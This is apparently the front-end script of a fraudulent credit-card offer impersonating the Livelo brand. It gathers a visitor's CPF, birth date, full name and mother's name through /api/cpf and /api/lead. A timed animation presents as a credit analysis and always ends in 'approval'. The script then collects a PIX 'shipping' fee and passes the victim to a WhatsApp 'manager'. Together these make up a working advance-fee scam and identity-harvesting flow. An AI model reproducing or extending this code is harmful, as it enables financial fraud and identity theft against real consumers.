/* ═══════════════════════════════════════════════════════════════
   LIVELO CREDIT SYSTEM — main.js
   Controle de fluxo do lead, integração com API C7 (PIX), UI State
═══════════════════════════════════════════════════════════════ */

// ============================================================================
// ESTADO GLOBAL
// ============================================================================
const STATE = {
  sessionId: localStorage.getItem('livelo_session') || null,
  cpf: '',
  nome: '',
  nome_mae: '',
  data_nasc: '',
  renda: null,
  tipo_renda: null,
  dia_vencimento: null,
  color: 'gradient_pink',
  style: 'standard',
  managerWa: '5511999999999',
  paymentId: null,
  pixCode: null
};

if (!STATE.sessionId) {
  STATE.sessionId = 'ses_' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
  localStorage.setItem('livelo_session', STATE.sessionId);
}

// Track Visit in Background
fetch('/api/visit', { method: 'POST' }).catch(() => {});

// ============================================================================
// UTILITÁRIOS
// ============================================================================
function $id(id) { return document.getElementById(id); }

function goToStep(stepId) {
  document.querySelectorAll('.screen').forEach(el => el.classList.remove('active'));
  $id(`screen-${stepId}`).classList.add('active');
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

function showErr(id, msg) {
  const el = $id(id);
  if (!el) return;
  el.textContent = msg;
  el.classList.remove('hidden');
}
function hideErr(id) {
  const el = $id(id);
  if (el) el.classList.add('hidden');
}

// ============================================================================
// MÁSCARAS
// ============================================================================
function mascaraCpf(v) {
  v = v.replace(/\D/g, "");
  if (v.length <= 11) {
    v = v.replace(/(\d{3})(\d)/, "$1.$2");
    v = v.replace(/(\d{3})(\d)/, "$1.$2");
    v = v.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
  }
  return v;
}
function mascaraData(v) {
  v = v.replace(/\D/g, "");
  if (v.length > 2) v = v.replace(/^(\d{2})(\d)/, "$1/$2");
  if (v.length > 5) v = v.replace(/^(\d{2})\/(\d{2})(\d)/, "$1/$2/$3");
  return v.substring(0, 10);
}
function mascaraTel(v) {
  v = v.replace(/\D/g, "");
  if (v.length > 2) v = v.replace(/^(\d{2})(\d)/g, "($1) $2");
  if (v.length > 9) v = v.replace(/(\d{5})(\d{4})$/, "$1-$2");
  return v;
}

const inputCpf = $id('input-cpf');
if (inputCpf) {
  inputCpf.addEventListener('input', (e) => {
    e.target.value = mascaraCpf(e.target.value);
    hideErr('cpf-error');
    // Revela campo de nascimento após CPF ter 11 dígitos
    const digits = e.target.value.replace(/\D/g, '');
    const nascGroup = $id('nasc-input-group');
    if (nascGroup) {
      if (digits.length === 11) {
        nascGroup.classList.remove('hidden');
        if ($id('input-nasc')) $id('input-nasc').focus();
      } else {
        nascGroup.classList.add('hidden');
      }
    }
  });
}
const inputNasc = $id('input-nasc');
if (inputNasc) {
  inputNasc.addEventListener('input', (e) => {
    e.target.value = mascaraData(e.target.value);
    hideErr('cpf-error');
  });
}
const inputWa = $id('input-whatsapp');
if (inputWa) {
  inputWa.addEventListener('input', (e) => {
    e.target.value = mascaraTel(e.target.value);
    hideErr('wa-error');
  });
}

// ============================================================================
// ETAPA 1: CPF
// ============================================================================
async function consultarCpf() {
  hideErr('cpf-error');
  const cpfVal = (inputCpf.value || '').replace(/\D/g, '');
  const nascVal = inputNasc ? inputNasc.value : '';

  if (cpfVal.length !== 11) {
    return showErr('cpf-error', 'Digite um CPF válido com 11 números.');
  }
  if (!nascVal || nascVal.length !== 10) {
    return showErr('cpf-error', 'Digite uma Data de Nascimento válida.');
  }

  $id('btn-consultar-text').classList.add('hidden');
  $id('btn-consultar-spin').classList.remove('hidden');
  $id('btn-consultar').disabled = true;

  try {
    const res = await fetch('/api/cpf', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cpf: cpfVal, data_nasc: nascVal })
    });
    const data = await res.json();
    
    if (data.ok) {
      STATE.cpf = data.cpf_fmt || cpfVal;
      STATE.nome = data.nome;
      STATE.nome_mae = data.nome_mae;
      STATE.data_nasc = data.data_nasc;
      
      $id('r-nome').textContent = data.nome.split(' ')[0] + ' ' + (data.nome.split(' ')[1] || '');
      $id('r-cpf').textContent = data.cpf_fmt;
      $id('r-mae').textContent = data.nome_mae.split(' ')[0] + ' ***';
      $id('r-nasc').textContent = data.data_nasc;
      
      $id('cpf-input-group').classList.add('hidden');
      $id('btn-consultar').classList.add('hidden');
      $id('cpf-result').classList.remove('hidden');
      
      // Update welcome screen name
      const firstName = data.nome.split(' ')[0];
      $id('welcome-name-display').textContent = firstName;
      $id('style-card-name').textContent = firstName;
      
      // Send initial lead capture
      fetch('/api/lead', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          session_id: STATE.sessionId,
          cpf: cpfVal,
          nome: data.nome,
          nome_mae: data.nome_mae,
          data_nasc: data.data_nasc
        })
      }).catch(console.error);
      
    } else {
      showErr('cpf-error', data.error || 'Não foi possível localizar este CPF.');
    }
  } catch (err) {
    showErr('cpf-error', 'Erro de conexão. Tente novamente.');
  } finally {
    $id('btn-consultar-text').classList.remove('hidden');
    $id('btn-consultar-spin').classList.add('hidden');
    $id('btn-consultar').disabled = false;
  }
}

function resetCpf() {
  $id('cpf-result').classList.add('hidden');
  $id('cpf-input-group').classList.remove('hidden');
  // Esconde nascimento de volta (progressive reveal)
  if ($id('nasc-input-group')) $id('nasc-input-group').classList.add('hidden');
  $id('btn-consultar').classList.remove('hidden');
  inputCpf.value = '';
  if (inputNasc) inputNasc.value = '';
  inputCpf.focus();
}

const btnCpfOk = $id('btn-cpf-ok');
if (btnCpfOk) {
  btnCpfOk.addEventListener('click', () => {
    // Update approved screen with name/cpf
    if ($id('approved-name-display')) $id('approved-name-display').textContent = STATE.nome ? STATE.nome.split(' ')[0] : 'SEU NOME';
    if ($id('summary-name')) $id('summary-name').textContent = STATE.nome ? STATE.nome.split(' ').slice(0,2).join(' ') : '—';
    if ($id('summary-end')) $id('summary-end').textContent = STATE.cpf || '—';
    goToStep('income');
  });
}

// ============================================================================
// ETAPA 2: RENDA E EMPREGO
// ============================================================================
function selectIncome(btn, val) {
  document.querySelectorAll('.big-choice-btn, .income-btn').forEach(el => el.classList.remove('selected'));
  btn.classList.add('selected');
  STATE.renda = val;
  hideErr('income-error');
  // Auto-avança após breve feedback visual
  setTimeout(() => goToStep('employment'), 260);
}

function submitIncome() {
  if (!STATE.renda) return showErr('income-error', 'Selecione uma faixa de renda.');
  goToStep('employment');
}

function selectEmprego(btn) {
  document.querySelectorAll('#screen-employment .big-choice-btn, .income-btn').forEach(el => el.classList.remove('selected'));
  btn.classList.add('selected');
  STATE.tipo_renda = btn.dataset.tipo;
  hideErr('emp-error');
  // Auto-avança
  setTimeout(() => goToStep('motivo'), 260);
}

function submitEmprego() {
  if (!STATE.tipo_renda) return showErr('emp-error', 'Selecione sua situação profissional.');
  goToStep('motivo');
}

function selectMotivo(btn) {
  document.querySelectorAll('#screen-motivo .option-tile, #screen-motivo .income-btn').forEach(el => el.classList.remove('selected'));
  btn.classList.add('selected');
  STATE.motivo_credito = btn.dataset.motivo;
  hideErr('motivo-error');
  // Auto-avança
  setTimeout(() => goToStep('billing'), 260);
}

function submitMotivo() {
  if (!STATE.motivo_credito) return showErr('motivo-error', 'Selecione o motivo para continuar.');
  goToStep('billing');
}

// ============================================================================
// ETAPA 3: VENCIMENTO
// ============================================================================
function selectDay(btn) {
  document.querySelectorAll('.day-btn').forEach(el => el.classList.remove('selected'));
  btn.classList.add('selected');
  STATE.dia_vencimento = btn.textContent.trim();
  hideErr('billing-error');
}

async function submitBilling() {
  if (!STATE.dia_vencimento) return showErr('billing-error', 'Selecione o dia de vencimento.');
  
  $id('billing-btn-text').classList.add('hidden');
  $id('billing-spin').classList.remove('hidden');
  
  try {
    const res = await fetch('/api/lead', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(STATE)
    });
    const data = await res.json();
    
    if (data.ok) {
      $id('approved-limit').textContent = data.limite;
      $id('done-limite').textContent = data.limite;
      
      // Update PIX step with correct shipping cost
      if (data.frete) {
        $id('pix-frete-display').textContent = data.frete;
      }
      
      startAnalysis();
    } else {
      showErr('billing-error', data.error || 'Erro ao processar.');
      $id('billing-btn-text').classList.remove('hidden');
      $id('billing-spin').classList.add('hidden');
    }
  } catch (err) {
    showErr('billing-error', 'Erro de conexão.');
    $id('billing-btn-text').classList.remove('hidden');
    $id('billing-spin').classList.add('hidden');
  }
}

// ============================================================================
// ANIMAÇÃO DE ANÁLISE
// ============================================================================
function startAnalysis() {
  goToStep('analysis');
  
  let pct = 0;
  const pctEl = $id('analysis-pct');
  const circleEl = $id('analysis-progress-circle');
  
  // Array of timers to clear if needed
  const timers = [];
  
  // Progress counter
  const interval = setInterval(() => {
    pct += 1;
    if (pct <= 100) {
      pctEl.textContent = pct + '%';
      const offset = 326 - (326 * pct) / 100;
      circleEl.style.strokeDashoffset = offset;
    } else {
      clearInterval(interval);
    }
  }, 45); // Takes about 4.5 seconds for 100%
  
  timers.push(interval);
  
  // Step checks
  timers.push(setTimeout(() => {
    $id('astep-1').querySelector('.astep-icon').classList.remove('pending');
    $id('astep-1').querySelector('.astep-icon').classList.add('checking');
  }, 300));
  
  timers.push(setTimeout(() => {
    $id('astep-1').querySelector('.astep-icon').classList.remove('checking');
    $id('astep-1').querySelector('.astep-icon').classList.add('done');
    $id('astep-2').querySelector('.astep-icon').classList.add('checking');
  }, 1200));
  
  timers.push(setTimeout(() => {
    $id('astep-2').querySelector('.astep-icon').classList.remove('checking');
    $id('astep-2').querySelector('.astep-icon').classList.add('done');
    $id('astep-3').querySelector('.astep-icon').classList.add('checking');
  }, 2500));
  
  timers.push(setTimeout(() => {
    $id('astep-3').querySelector('.astep-icon').classList.remove('checking');
    $id('astep-3').querySelector('.astep-icon').classList.add('done');
    $id('astep-4').querySelector('.astep-icon').classList.add('checking');
  }, 3800));
  
  timers.push(setTimeout(() => {
    $id('astep-4').querySelector('.astep-icon').classList.remove('checking');
    $id('astep-4').querySelector('.astep-icon').classList.add('done');
  }, 4700));
  
  // Go to approved screen
  timers.push(setTimeout(() => {
    goToStep('approved');
  }, 5200));
}

// ============================================================================
// CUSTOMIZADOR DE CARTÃO
// ============================================================================
function selectCardColor(btn) {
  document.querySelectorAll('.color-btn').forEach(el => {
    el.classList.remove('active');
    el.querySelector('.color-check').classList.add('hidden');
  });
  
  btn.classList.add('active');
  btn.querySelector('.color-check').classList.remove('hidden');
  
  const color = btn.dataset.color;
  STATE.color = color;
  
  $id('customizer-card').dataset.color = color;
}

function submitCardStyle() {
  fetch('/api/card-style', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ session_id: STATE.sessionId, color: STATE.color, style: STATE.style })
  }).catch(console.error);
  // Vai para tela de escolha de frete
  goToStep('shipping');
}

// Seleção de método de envio — carrega gerente e vai ao WhatsApp
function selectShipping(type, price) {
  STATE.frete_tipo = type;
  STATE.frete_valor = price;
  // Atualiza valor exibido no PIX
  const display = price.toFixed(2).replace('.', ',');
  [$id('pix-frete-display'), $id('approved-frete-val')].forEach(el => {
    if (el) el.textContent = 'R$ ' + display;
  });
  // Feedback visual na opção escolhida
  ['ship-sedex','ship-pac'].forEach(id => {
    const el = $id(id);
    if (el) el.classList.toggle('selected', el.id === `ship-${type}`);
  });
  // Carrega dados do gerente e avança
  fetch('/api/manager')
    .then(r => r.json())
    .then(data => {
      if (data.ok) {
        $id('mgr-display-name').textContent = data.name;
        $id('manager-photo-img').src = data.photo_url;
        $id('mgr-since-badge').innerHTML = `
          <svg viewBox="0 0 16 16" fill="none" width="12" height="12">
            <path d="M8 2l1.5 3L13 5.5l-2.5 2.5.6 3.5L8 10l-3.1 1.5.6-3.5L3 5.5 6.5 5z" fill="#E91E8C"/>
          </svg>
          Melhor gerente ${data.since_year || 2025}
        `;
      }
    })
    .catch(console.error)
    .finally(() => {
      setTimeout(() => goToStep('whatsapp'), 350);
    });
}

// ============================================================================
// WHATSAPP
// ============================================================================
async function submitWhatsapp() {
  hideErr('wa-error');
  const waVal = (inputWa.value || '').replace(/\D/g, '');
  
  if (waVal.length < 10) {
    return showErr('wa-error', 'Digite um número de WhatsApp válido com DDD.');
  }
  
  $id('btn-wa-text').classList.add('hidden');
  $id('wa-btn-arrow').classList.add('hidden');
  $id('btn-wa-spin').classList.remove('hidden');
  $id('btn-wa-continuar').disabled = true;
  
  try {
    const res = await fetch('/api/whatsapp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ session_id: STATE.sessionId, whatsapp: waVal })
    });
    const data = await res.json();
    
    if (data.ok) {
      STATE.managerWa = data.manager_wa || data.manager_whatsapp || '5511999999999';
      gerarPix();
    } else {
      showErr('wa-error', data.error || 'Erro ao salvar. Tente novamente.');
      $id('btn-wa-text').classList.remove('hidden');
      $id('wa-btn-arrow').classList.remove('hidden');
      $id('btn-wa-spin').classList.add('hidden');
      $id('btn-wa-continuar').disabled = false;
    }
  } catch (err) {
    showErr('wa-error', 'Erro de conexão.');
    $id('btn-wa-text').classList.remove('hidden');
    $id('wa-btn-arrow').classList.remove('hidden');
    $id('btn-wa-spin').classList.add('hidden');
    $id('btn-wa-continuar').disabled = false;
  }
}

// ============================================================================
// PIX E PAGAMENTO
// ============================================================================
let pixCheckInterval = null;

async function gerarPix() {
  goToStep('pix');
  
  $id('qr-loading').classList.remove('hidden');
  $id('qr-img').classList.add('hidden');
  $id('pix-code-text').value = 'Gerando código PIX...';
  
  try {
    const res = await fetch('/api/gerar-pix', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ session_id: STATE.sessionId })
    });
    const data = await res.json();
    
    if (data.ok) {
      STATE.paymentId = data.payment_id;
      STATE.pixCode = data.pix_code;
      
      $id('pix-code-text').value = data.pix_code;
      
      if (data.qr_code_url) {
        $id('qr-img').src = data.qr_code_url;
        $id('qr-img').onload = () => {
          $id('qr-loading').classList.add('hidden');
          $id('qr-img').classList.remove('hidden');
        };
      } else {
        $id('qr-loading').innerHTML = 'Código PIX gerado.<br>Copie o texto abaixo.';
      }
      
      // Start polling for payment status
      startPixPolling(data.payment_id);
      
    } else {
      $id('qr-loading').innerHTML = '<span style="color:#DC2626">Erro ao gerar cobrança.<br>Atualize a página.</span>';
      $id('pix-code-text').value = '';
    }
  } catch (err) {
    $id('qr-loading').innerHTML = '<span style="color:#DC2626">Falha de conexão.<br>Tente novamente.</span>';
    $id('pix-code-text').value = '';
  }
}

function copyPix() {
  const pixCode = $id('pix-code-text').value;
  if (!pixCode || pixCode.includes('Gerando')) return;
  
  navigator.clipboard.writeText(pixCode).then(() => {
    $id('copy-feedback').classList.remove('hidden');
    setTimeout(() => {
      $id('copy-feedback').classList.add('hidden');
    }, 3000);
  }).catch(err => {
    // fallback
    const ta = $id('pix-code-text');
    ta.select();
    document.execCommand('copy');
    $id('copy-feedback').classList.remove('hidden');
    setTimeout(() => {
      $id('copy-feedback').classList.add('hidden');
    }, 3000);
  });
}

function startPixPolling(paymentId) {
  if (pixCheckInterval) clearInterval(pixCheckInterval);
  
  let attempts = 0;
  pixCheckInterval = setInterval(async () => {
    attempts++;
    if (attempts > 120) { // Stop polling after 10 minutes (5s interval)
      clearInterval(pixCheckInterval);
      return;
    }
    
    try {
      const res = await fetch(`/api/status-pix/${paymentId}`);
      const data = await res.json();
      
      if (data.ok && (data.status === 'paid' || data.status === 'authorized' || data.status === 'completed')) {
        clearInterval(pixCheckInterval);
        
        // Update UI briefly before transition
        $id('pix-status-dot').classList.add('paid');
        $id('pix-status-text').textContent = 'Pagamento Confirmado!';
        $id('pix-status-text').style.color = '#10B981';
        $id('pix-status-text').style.fontWeight = '700';
        
        setTimeout(() => {
          showDone();
        }, 1500);
      }
    } catch (err) {
      console.error('Polling error', err);
    }
  }, 5000); // Check every 5 seconds
}

function showDone() {
  // Configura link do zap
  let waNumber = STATE.managerWa;
  if (!waNumber.startsWith('55')) waNumber = '55' + waNumber;
  const msg = encodeURIComponent(`Olá! Acabei de pagar o frete do meu cartão Livelo (Sessão: ${STATE.sessionId.substring(0,8)}). Gostaria de confirmar a entrega!`);
  
  $id('btn-contact-manager').href = `https://wa.me/${waNumber}?text=${msg}`;
  
  goToStep('done');
}
